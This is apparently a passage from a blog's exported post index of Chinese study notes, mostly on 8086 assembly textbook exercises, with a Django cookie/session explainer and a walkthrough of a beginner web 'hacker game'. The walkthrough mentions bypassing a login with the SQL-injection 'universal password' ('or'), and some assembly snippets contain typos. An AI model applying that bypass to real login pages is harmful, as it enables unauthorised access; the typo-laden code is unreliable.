ds:[0Eh]这三条指令。而sp-2就是0Eh了，push ip就是把第一条inc ax对应的ip值给压入栈。存放在ss:[0Eh]和ss:[0Fh]里面。接下来是jmp word ptr ds:[0Eh]了，它的功能就是把stack段的[0eh]子单元的值付给ip，很巧的是stack中[0eh]字单元的值就是刚刚压入的ip值。所以ip值没有改变。程序继续执行inc ax后面的程序。所以ax的值是3.]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret和retf]]></title>
    <url>%2F2018%2F09%2F12%2Fret%E5%92%8Cretf%2F</url>
    <content type="text"><![CDATA[ret指令用栈中的数据，修改IP的内容，从而实现进转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移； CPU执行ret指令时，进行下面两步操作：（1） （IP)=((ss)*16+(sp))（2） (sp)=(sp)+2 CPU执行retf指令时，进行下面4部操作：(1) (IP)=((ss)16+(sp))(2) (sp)=(sp)+2(3) (CS)=((ss)16+(sp))(4) (sp)=(sp)+2 可以看出，CPU执行ret指令时，相当于进行：pop IP CPU执行retf指令时，相当于进行：pop IPpop CS 例如：1、1234567891011121314151617181920assume cs:codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push axmov bx,0retcode endsend start ret指令执行后CS：IP指向代码的第一条指令2、1234567891011121314151617181920assume cs;codestack segmentdb 16 dup (0)stack endscode segmentmov ax,4c00hint 21hstart: mov ax,stackmov ss,axmov sp,16mov ax,0push cspush axmov bx,0retfcode endsend start retf指令执行后，CS：IP指向代码段的第一条指令。]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作符offset]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%93%8D%E4%BD%9C%E7%AC%A6offset%2F</url>
    <content type="text"><![CDATA[操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：123456assume cs:codesgcodesg segmentstart:mov ax,offset strat ;相当于mov ax,0s: mov ax,offset s ;相当于mov ax,3codesg endsend start offset操作符取得了标号start和s的偏移地址0和3因为start是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0；而s标记的指令是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3. 又比如：]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dup指令]]></title>
    <url>%2F2018%2F09%2F11%2Fdup%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。dup的使用格式如下：db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字符数据） 比如：1、3 dup (0)```123定义了三个字节，它们的值都是0，相当于db 0,0,0。2、 stack segmentdb 200 dup (0)stack ends`定义了一个容量为200个字节的栈段]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[div指令]]></title>
    <url>%2F2018%2F09%2F11%2Fdiv%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[div是除法指令，使用div做除法时应注意以下问题。 1、除数：有8位和16位两种，在一个reg或内存单元中。2、被除数：默认放在AX或DX和AX中，如果除数位8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX放高16位，AX存放低16位。3、结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。 例如：1、除数为8位： 1div byte ptr ds:[0] 含义：（al）=（ax）/（（ds）*16+0）的商 （ah）=（ax）/（ds)*16+0)的余数 2、除数为16位： 1div word ptr es:[0] 含义：(ax)=[(dx)*10000H+(ax)] / ((es)*16+0)的商 （dx）=[(dx)*10000H+(ax)] / (es)*16+0)的余数 3、用除法指令计算100001/100 分析：被除数100001大于65535（ffffh），所以用dx和ax两个寄存器联合存放100001，除数100虽然小于255可以在一个8位寄存器中存放，但是，因为除数是32位的，除数应为16位，所以要用16位寄存器存放除数100100001表示为16进制为：186A1H。程序如下：1234mov dx,1mov ax,86A1H ;(dx)*10000H+(ax)=100001mov bx,100div bx 程序执行后（ax）=03E8H（即1000）（dx）=1（余数为1） 4、用除法指令计算1001/100分析：被除数1001可用ax寄存器存放，除数100可用8位寄存器存放，也就是说，要进行8位的除法。程序如下：123mov ax,1001mov bl,100div bl 程序执行后，（al）=0AH（即10），（ah）=1（余数为1） 5、]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[and和or指令]]></title>
    <url>%2F2018%2F09%2F11%2Fand%E5%92%8Cor%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[1、and指令：逻辑与指令，按位进行与运算通过该指令可将操作对象位设为0，其他为不变 例如：12mov al,01100011Band al,00111011B 执行后al=00100011B 2、or指令：逻辑或指令，按位进行或运算。通过该指令可将操作对象位设为1，其他位不变 例如指令： 12mov al,0110001Bor al,00111011B 执行后：al=01111011B]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测点6.1]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%A3%80%E6%B5%8B%E7%82%B96-1%2F</url>
    <content type="text"><![CDATA[知识点：1.用于显式地指明内存单元的段地址的”ds:” “cs:” “ss:” “es:” 在汇编语言中称为段前缀 2.Dos方式下，一般情况，0:200 - 0:2ff空间中没有系统或其他程序的数据或代码。 检测点：(1)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，完成程序：123456789101112131415161718assume cs:codesgcodesg segmentdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hstart: mov ax,0mov ds,axmov bx,0mov cx,8s: mov ax,[bx]mov cs:[bx],axadd bx,2loop smov ax,4c00hint 21hcodesg endsend start (2)下面的程序实现依次用内存0:0 - 0:15单元中的内容改写程序中的数据，数据的传送用栈来进行。栈空间设置栈程序中。完成程序：123456789101112131415161718192021assume cs:codesgcodesg segmentdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdw 0,0,0,0,0,0,0,0,0,0start: mov ax,csmov ss,axmov sp,24hmov ax,0mov ds,axmov bx,0mov cx,8s: push [bx]pop [bx]add bx,2loop smov ax,4c00hint 21hcodesg endsend start]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在代码段中使用栈]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%A0%88%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526assum cs:codesgcode segement dw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;用dw定义16个字型数据，在程序加载后，将取得 16个字的内存空间，存放着6个数据。在后面的程 序中将这段空间当作栈来使用start: mov ax,cs mov ss,ax mv sp,30h ;设置栈顶ss：sp指向CS：30 mov bx,0 mov cz,8 s: push cs:[bx] add bx,2 loop s s0: pop cs[bx] add bx,2 loop s0 ;将定义的数据逆序存放 mov ax,4c00h int 21hcodesg endsend start]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在代码段中使用数据]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[编程计算以下8个数据的和，结果存在ax寄存器中： 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987H123456789101112131415assum cs:code code segementdw 0123H，0456H，0789H，0abcH，0defH，0fedH，0cbaH，0987Hmov bx,0mov ax,0mov cz,8s: add ax,cs:[bx]add bx,2loop smov ax,4c00hint 21hcode endsend dw的含义是定义字型数据，dw即“define word”，在这里，使用dw定义了8个字型数据，它们所占的内存空间的大小为16个字节。程序在运行的时候cs中存放代码段的段地址，所以可以从cs中得到它们的段地址 因为用dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是CS：0、CS：2、CS：4、CS：6、CS：8、CS：A、CS：C、CS：E。用bx存放加2递增的偏移地址用循环来进行累加。在循环开始前,设置（bx）=0，CS：BX指向第一个数据存放的字单元。每次循环中（bx）=（bx）+2，CS：BX指向下一个数据所在的字单元。]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Loop指令]]></title>
    <url>%2F2018%2F09%2F10%2FLoop%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[loop指令的格式是：loop 标号CPU执行loop指令的时候，要进行两步操作，1、(cx)=(cx)-12、判断cx中的值，不为零则转至标号处执行，如果为零则向下执行 例子1：计算2的十二次方123456789101112assume cs:code code segmentmov ax,2mov cx,11s: add ax,axloop smov ax,4c00Hint 21Hcode endsend 例子2：用加法计算123*236 123456789101112assume cs:codecode segmentmov ax,0mov cx,123s: add ax,236loop smov ax,4c00Hint 21Hcode endsend]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寄存器（内存访问）]]></title>
    <url>%2F2018%2F09%2F08%2F%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89%2F</url>
    <content type="text"><![CDATA[寄存器（内存访问）内存中字的存储 DS和[address] 8086CPU中有一个DS寄存器，通常用来存放要访问数据的地址段 [address]表示一个内存单元，address表示内存单元的偏移地址 如果要读取10000H单元的内容，可以用如下的程序段进行 mov bx,1000H mov ds,bx mov al,[0] 上面的3条指令将10000H（1000：0）中的数据读到al中 字的传送mov bx,1000H mov ds,bx mov ax,[0] ;1000:0处的数据送入ax mov [0],cx ;cx中的16位数据送到1000:0处 问题1 问题2 问题3 检测点3.1(1)在Debug 中，用”d 0:0 1f” 查看内存，结果如下： 0000:0000 70 80 F0 30 EF 60 30 E2-00 80 80 12 66 20 22 60 0000:0010 62 26 E6 D6 CC 2E 3C 3B-AB BA 00 00 26 06 66 88 下面的程序执行前，AX=0,BX=0，写出每条汇编指令执行完毕后相关寄存器中的值： Mov ax,1 Mov ds,ax Mov ax,[0000] AX=2662 Mov bx,[0001] BX=E626 Mov ax,bx AX=E626 Mov ax,[0000] AX=2662 Mov bx,[0002] BX=D6E6 Add ax,bx AX=FD48 Add ax,[0004] AX=2C14 Mov ax,0 AX=0 Mov al,[0002] AX=00E6 Mov bx,0 BX=0 Mov bl,[000C] BX=0026 Add al,bl AX=000C (2) mov ax,6622H CS=2000H IP=0002H jmp 0ff0:0100 CS=0ff0H IP=0100H 物理地址=CS*16+IP=10000H mov ax,2000H CS=0ff0H IP=0103H mov ds,ax CS=0ff0H IP=0105H mov ax,[0008] CS=0ff0H IP=0108H mov ax,[0002] CS=0ff0H Ip=010BH 第一步：CS=2000H，IP=0H 地址：20000H 读取第一条指令 mov ax,6622H CS=2000H, IP=03H 执行指令 mov ax,6622H 执行结果：AX=6622H 第二步：地址：20003H 读取第二条指令 jmp 0ff0:0100 CS=2000H,IP=03H 执行指令：jmp 0ff0:0100 执行结果：CS=0ff0H, IP=0100H 第三步：地址：CSx16+IP = 10000H 读取指令：mov ax,2000H CS=0ff0H, IP=0103H 执行指令：mov ax,2000H 执行结果：AX=2000H 第四步：地址：10003H 读取指令：mov ds,ax CS=0ff0H, IP=0105H 执行指令：mov ds,ax 执行结果：ds=2000H 第五步：地址：10005H 读取指令：mov ax,[0008] CS=0ff0H，IP=10008H，DS=2000H 执行指令：mov ax,[0008] ; 也就是将地址【DS：IP】为 2000H：0008H的值移动到AX 执行结果：AX=C189H 第六步：读取指令：mov ax,[0002] CS=0ff0H ,IP=1000BH,DS=2000H 执行指令：mov ax,[0002] 执行结果：AX=EA66 知识点： 任意时刻SS:SP 指向栈顶元素。 push指令和pop指令执行时，CPU从 SS和SP中得到栈顶的地址。 注：SS(Stack Segmet)堆栈段寄存器，指向当前的堆栈段。 SP(Stack Pointer)堆栈指针寄存器，主要用于堆栈操作，存放堆栈段首地 址到栈顶单元的偏移量。 入栈时：886CPU栈顶从高地址向低地址方向增长。 CPU提供的栈机制CS、IP中存放着当前指令的段地址和偏移地址，而段寄存器SS和寄存器SP为CPU的入栈，出栈服务。任意时刻SS：SP指向栈顶元素。 问题1如果将10000H~1000Fh这段空间当作栈，初始空间是空的，此时，SS=1000H，SP=0010H 问题2利用栈，交换AX和BX中的数据 mov ax,1000H mov ss,ax mov sp,0010H ;初始化栈顶 mov ax=001AH mov bx=001BH push ax push bx pop ax ；当前栈顶的数据是bx中的欲来的数据，所以先pop ax，即ax=001BH pop bx ；执行pop ax后，栈顶的数据为ax原来的数据，所以再pop bx，即bx=001AH 问题3利用栈在10000H处写入数据2266H mov ax,1000H mov ss,ax mov sp,0002H mov ax,2266H push ax 一般写法 mov ax,1000H mov ds,ax mov ax,2266H mov [0],ax]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寄存器]]></title>
    <url>%2F2018%2F09%2F07%2F%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[寄存器 一个典型的CPU有运算器、控制器、寄存器等器件构成 寄存器是CPU中程序员可以用执行读写的部件。程序员通过改变各种寄存器中的内容来实现对CPU的控制 不同的CPU，寄存器的个数、结构是不同的。8086CPU有14个寄存器，每个寄存器有一个名称。这些寄存器是：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PWS、 通用寄存器 8086CPU的的所有寄存器都是16位的，可以存放两个字节，AX、BX、CX、DX、这四个寄存器位通用寄存器 一个16位的寄存器可以存储一个16位的数据，所能存储的数据最大值为2^16-1，或用16进制表示为FFFFH，也为10000H-1 AX的低8位构成了AL寄存器，高8位构成了AH寄存器，AH和AL寄存器是可以独立使用的 字在寄存器中的存储 一个16位的寄存器可以存放两个字节（byte），即为一个字（word），一个字等于两个字节 而计算机的存储单元为字节（byte），一个内存（存储）单元可以存放8位数据（bit），也就是说，计算机中的数据大多是由1~N个8位数据构成。 很多时候，用16进制表示数据可以直观的看出数据是由哪些8位数据构成，如2000写成4E20，可以看出是由4E和20两个8位数据构成的，如果AX中存放4E20H，则AH里是4E，AL里是20mov和add汇编指令原AX，BX中的值：0000H，0000H问题2.1在执行前ax和bx中的数据都为8226H，相加后所得值为：1044CH，但ax为16位寄存器，只能存放4位十六进制的数据，所以最高位的1不能在ax中保存，，ax中的数据为：044CH问题2.2在执行前，al中的数据为C5H，相加后所得的值为：158H，但是al为8位寄存器，只能诚邀您放两位16精致的数据，所以最高位的1丢失，ax中的数据为：0058H检测点2.1： (1)写出每条汇编指令执行后相关寄存器中的值。 mov ax,62627 AX= F4A3H mov ah,31H AX=31A3H mov al,23H AX=3123H add ax,ax AX=6246H mov bx,826CH BX=826CH mov cx,ax CX=6246H mov ax,bx AX=826CH add ax,bx AX=04D8H mov al,bh AX=0482H mov ah,bl AX=6C82H add ah,ah AX=D882H add al,6 AX=D888H add al,al AX=D810H mov ax,cx AX=6246H (2)只能使用目前学过的汇编指令，最多使用4条指令，计算2的4次方. mov ax,2h add ax,ax add ax,ax add ax,ax 物理地址 段地址*16+偏移地址=物理地址的本质含义CPU在访问内存时，用一个基础地址（段地址*16）和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址 检测点2.2（1）给定段地址为0001H，仅通过变化偏移地址寻址，CPU的寻址范围为多少到多少？ 答：物理地址=SA*16+EA EA的变化范围为0H~FFFFH 物理地址范围为（SA16+0H）~（SA16+FFFFH） 现在SA=0001H，那么寻址范围为 （0001H16+0H）~（0001H16+FFFFH）=00010H~1000FH （2）有一数据存放在内存20000H单元中，现给定段地址为SA，若想用偏移地址寻到此单元。则SA应满足的条件是：最小为多少？最大为多少？ 答： 物理地址 20000H ＝ SA * 10H ＋ 偏移地址 显然，偏移地址应该取最大值，SA 才能达到最小。 那么，偏移地址取最大值：FFFFH，行吗？ 代入上述方程，发现，两边的，最末位，不相等。 偏移地址最大值，只能取到：FFF0H，方程才有可能成立。 按照公式： 物理地址 ＝ SA * 10H ＋ 偏移地址 可知，物理地址、偏移地址，两者的最低位，必定是相同的。 当物理地址＝20000H，偏移地址也只能是：XXX0H，取最大就是 FFF0H。 于是：SA = (20000H － FFF0H) / 16＝10010H / 16 ＝ 1001H。 标记：王爽汇编语言，段地址*16+偏移地址=物理地址，其中16是十进制。 提示，反过来思考一下，当段地址给定为多少，CPU无论怎么变化偏移地址都无法寻到20000H单元？ 答： 先求出，段地址为多少的时候，变化偏移地址可找到20000H地址单元。 段地址 × 16 + 偏移地址 = 20000H 偏移地址=0000H，段地址则为 2000H； 偏移地址=FFF0H，段地址则为 1001H。 那么，当段地址大于 2000H，或小于 1001H，就不能找到 20000H。 CS和IPCS和IP是8086CPU中最为关键的寄存器，CS为代码段寄存器（存放段地址），IP为指令指针寄存器（存放偏移地址） 1、 汇编指令由操作码和操作数组成 如：mov ax,0 mov为操作数 表示指令的功能（是传送指令） ax,0是2个操作数 即0（0000H）为源操作数 ax为目的操作数 该指令就是 将源操作数传送给目的操作数 从ax可以看出是一条16位的传送指令2、 mov ax,0在内存中的机器指令是B8 00 00 B8 是操作码 表示是一条以ax为目的操作数的传送指令（操作数ax为寄存器寻址 隐含在操作码 中，00 00 表示的是一个16位的立即数即0000H 低8位在前 高8位在后。3、汇编指令在内存中 就是以B8 00 00机器指令表示的二进制代码。 问题2.3 检测点下面的3条指令执行后，cpu几次修改IP？都是在什么时候？最后IP中的值是多少？ mov ax,bx sub ax,ax jmp ax 注：mov ax,bx (高级编程语言就是ax=bx ) sub ax,ax (高级编程语言就是ax=ax-ax 发现ax=0H) jmp ax (偏移增量为ax,进而IP=IP+ax，即加上索引的字节数） 一共修改四次 第一次：读取mov ax,bx之后 第二次：读取sub ax,ax之后 第三次：读取jmp ax之后 第四次：执行jmp ax修改IP 最后IP的值为0000H，因为最后ax中的值为0000H，所以IP中的值也为0000H]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cpu与存储器]]></title>
    <url>%2F2018%2F09%2F07%2Fcpu%2F</url>
    <content type="text"><![CDATA[cpu中央处理器（CPU，Central Processing Unit）是一块超大规模的集成电路，是一台计算机的运算核心（Core）和控制核心（ Control Unit）。它的功能主要是解释计算机指令以及处理计算机软件中的数据。中央处理器主要包括运算器（算术逻辑运算单元，ALU，Arithmetic Logic Unit）和高速缓冲存储器（Cache）及实现它们之间联系的数据（Data）、控制及状态的总线（Bus）。它与内部存储器（Memory）和输入/输出（I/O）设备合称为电子计算机三大核心部件。 物理结构CPU包括运算逻辑部件、寄存器部件和控制部件等。 逻辑部件运算逻辑部件。可以执行定点或浮点算术运算操作、移位操作以及逻辑操作，也可执行地址运算和转换。 寄存器寄存器部件，包括寄存器、专用寄存器和控制寄存器。 通用寄存器又可分定点数和浮点数两类，它们用来保存指令执行过程中临时存放的寄存器操作数和中间（或最终）的操作结果。 通用寄存器是中央处理器的重要部件之一。 工作过程CPU从存储器或高速缓冲存储器中取出指令，放入指令寄存器，并对指令译码。它把指令分解成一系列的微操作，然后发出各种控制命令，执行微操作系列，从而完成一条指令的执行。指令是计算机规定执行操作的类型和操作数的基本命令。指令是由一个字节或者多个字节组成，其中包括操作码字段、一个或多个有关操作数地址的字段以及一些表征机器状态的状态字以及特征码。有的指令中也直接包含操作数本身。 存储器CPU是计算机的核心部件，要想让一个CPU工作，就必须向它提供指令和数据。而指令和数据在存储器中存放，也就是我们平时说的内存。 存储单元 存储器被划分若干个存储单元，每个存储单元从0开始循序编号 这些编号可以看作存储单元在存储器中的地址 一个存储单元可以存储一个Byte，即8个二进制位（bit） CPU对存储器的读写 CPU通过地址线将地址信息3发出 CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据 存储器将三号单元中的数据8通过数据线送入CPU。写操作与读操作的步骤相似。如向3号单元写入数据26 地址总线 若一个CPU有N根地址总线，也就是说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单位 数据总线 数据总线的宽度决定了CPU和外界的数据传送速度。8根数据总线 一次可传送一个8位二进制数据（即一个字节）。16根数据总线一次可传送两个字节 8088CPU的数据总线宽度为8,8086CPU的为16 控制总线 CPU对外部器件的控制是通过控制总线来进行的 控制总线的跨度决定了CPU对外部器件的控制能力 检测点1.1 一个CPU的寻址能力为8KB，那么他的地址总线宽度为13。2^n=1024*8n为总线宽度。已知2^10 = 1024因此n=13 1KB的存储器有1024个存储单元。存储单元的编号从0到1023 。2^10=1KB=1024 1KB的存储器可以存储 8192个bit, 1024 个Byte。1Byte=8bit 1GB、1MB、1KB分别是2^30 Byte,2^20 Byte,2^10 Byte。102410241024=2^301024*1024=2^201024=2^10 8080、8088、80286、80386的地址总线宽度分别为16根、20根、24根、32根，则他们的寻址能力分别为： 64 （KB）、 1 （MB）、 16 （MB）、 4 （GB）。2^10=1K 2^6=642^20=1M2^4=162^30=1G 2^2=4 8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为： 1 （B）、 1 （B）、 2 （B）、 2 （B） 4 （B）。1Byte=8bit每8根总线一次最多可传递一字节数据。 从内存中读取1024字节的数据，8086至少要读 512 次，80386至少要读 256 次。8086每次读2字节数据80386每次读4字节数据 在存储器中，数据和程序以 二进制 形式存放。数据与程序在存储器中以无差别的二进制数据形式存放 存储器芯片 一台PC机上，装有多个存储器芯片，从读写属性上看分为两类：随机存储器（RAM）和只读存储器（ROM） 随机存储器用于放供CPU使用的绝大部分程序和数据 内存地址空间 所有的物理存储器被看作一个由若干存储单元组成的的逻辑存储器 每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 CPU在这段地址空间中读写数据，实际上就是在相对于的物理存储器中读写数据]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie和Session]]></title>
    <url>%2F2018%2F08%2F09%2FCookie%E5%92%8CSession%2F</url>
    <content type="text"><![CDATA[1、Cookie介绍 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用cookie）。Cookie名称和值可以由服务器端开发自己定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等，服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。 简单来说，Cookie 是保存在浏览器的一个键值对，每次的HTTP请求都会携带 Cookie 。 cookie的作用 服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。 Django框架的下cookie1、 获取Cookie： 获取已经设置好的cookies极其简单。 每一个HttpRequest 对象都有一个COOKIES 对象，该对象的行为类似一个字典，你可以使用它读取任何浏览器发送给视图（view）的cookies。 获取普通cookie request.COOKIES[&apos;key&apos;] request.COOKIES.get(&apos;key&apos;) 解密带签名的cookie request.get_signed_cookie(key, default=RAISE_ERROR, salt=&apos;&apos;, max_age=None) 参数： default: 默认值 salt: 加密盐 max_age: 后台控制过期时间 2、设置Cookie：rep = HttpResponse(...) 或 rep ＝ render(request, ...) #设置cookie需要使用 HttpResponse对象的 set_cookie()方法 #设置普通cookie rep.set_cookie(key,value,...) #设置带签名的cookie rep.set_signed_cookie(key,value,salt=&apos;加密盐&apos;,...) #参数： key, 键 value=&apos;&apos;, 值 max_age=None, 超时时间 expires=None, 超时时间(IE requires expires, so set it if hasn&apos;t been already.) path=&apos;/&apos;, Cookie生效的路径，/ 表示根路径，特殊的：跟路径的cookie可以被任何url的页面访问 domain=None, Cookie生效的域名 secure=False, https传输 httponly=False 只能http协议传输，无法被JavaScript获取（不是绝对，底层抓包可以获取到也可以被覆盖） 由于cookie保存在客户端的电脑上，所以，JavaScript和jquery也可以操作cookie。 &lt;script src=&apos;/static/js/jquery.cookie.js&apos;&gt;&lt;/script&gt; $.cookie(&quot;list_pager_num&quot;, 30,{ path: &apos;/&apos; }); 注意： Cookie(特别是那些没通过HTTPS传输的)是非常不安全的。 因为HTTP数据是以明文发送的，所以 特别容易受到嗅探攻击。 也就是说，嗅探攻击者可以在网络中拦截并读取cookies，因此你要 绝对避免在cookies中存储敏感信息。 这就意味着您不应该使用cookie来在存储任何敏感信息。 因此不能在cookies中存储可能会被篡改的敏感数据。 在cookies中存储 IsLoggedIn=1 ，以标识用户已经登录。 犯这类错误的站点数量多的令人难以置信； 绕过这些网站的安全系统也是易如反掌。 2、Session1、介绍 在WEB开发中，服务器可以为每个用户浏览器创建一个会话对象（session对象），注意：一个浏览器独占一个session对象(默认情况下)。因此，在需要保存用户数据时，服务器程序可以把用户数据写到用户浏览器独占的session中，当用户使用浏览器访问其它程序时，其它程序可以从用户的session中取出该用户的数据，为用户服务。 Session与Cookie的区别： Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。 Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。 Session 必须要依赖 Cookie ，因为 Cookie的值就等于 Session 的Key ###Session的工作原理: 当用户第一次访问时，服务器会给其创建一个session，并且把session的Id(本质是随机字符串)以cookie的形式发送给客户端浏览器，下次再去访问服务器时，客户机浏览器会把存储到cookie中的session的Id一起传递到服务器端，服务器发现客户机浏览器带session id过来了，就会使用内存中与之对应的session为之服务 2、Django下的 Session 框架 由于存在的限制与安全漏洞，cookies和持续性会话已经成为Web开发中令人头疼的典范。 好消息是，Django的目标正是高效的“头疼杀手”，它自带的session框架会帮你搞定这些问题。 你可以用session 框架来存取每个访问者任意数据， 这些数据在服务器端存储，并对cookie的收发进行了抽象。 Cookies只存储数据的哈希会话ID，而不是数据本身，从而避免了大部分的常见cookie问题。 Django中默认支持Session，其内部提供了5种类型的Session供开发者使用： 数据库（默认） 缓存 文件 缓存+数据库 加密cookie]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑客游戏]]></title>
    <url>%2F2018%2F08%2F07%2F%E9%BB%91%E5%AE%A2%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[第一关网址：http://www.cn-hack.cn/qs/5.htm 进来可以看到要求输入密码进入下一关，可以先看下页面源代码发现下一关的网址，如图： 那就进入http://www.cn-hack.cn/qs/2sdfadf.htm来到第二关 第二关是一张图片，提示密码在图片中，那就把图片下载下来，改为txt文档，打开看看，发现第三关的网址，如图： 进入第三关的网址http://www.cn-hack.cn/qs/or3.htm 第三关就直接给出密码：%68%74%74%70%3A%2F%2F%77%77%77%2E%63%6E%2D%68%61%63%6B%2E%63%6E%2F%71%73%2F%34%64%66%73%61%2E%68%74%6D ，不过是经过URL加密过的，进行URL解密得到网址：http://www.cn-hack.cn/qs/4dfsa.htm 进入第四关http://www.cn-hack.cn/qs/4dfsa.htm 需要输入用户名和密码，先看看页面源代码，没发现什么，那就随便输入用户名和密码，然后跳转到一个页面，那就在看看源代码， 发现第五关的地址进入第五关http://www.cn-hack.cn/qs/789.htm 进来就让你输入通用密码中的两个字母，想看页面源代码也看不了，上网搜搜SQL通用密码，知道了密码为 or ,输入进去就通关了]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python的文件移动和复制]]></title>
    <url>%2F2018%2F08%2F01%2Fpython%E7%9A%84%E6%96%87%E4%BB%B6%E7%A7%BB%E5%8A%A8%E5%92%8C%E5%A4%8D%E5%88%B6%2F</url>
